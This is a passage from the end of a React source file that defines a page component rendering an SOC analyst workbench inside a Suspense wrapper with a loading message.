    </div>
  );
}

export default function SocToolsPage() {
  return (
    <Suspense
      fallback={
        <div className="p-12 text-center text-xs font-bold text-[var(--text-secondary)]">
          LOADING SOC ANALYST WORKBENCH...
        </div>
      }
    >
      <SocWorkbenchContent />
    </Suspense>
  );
}
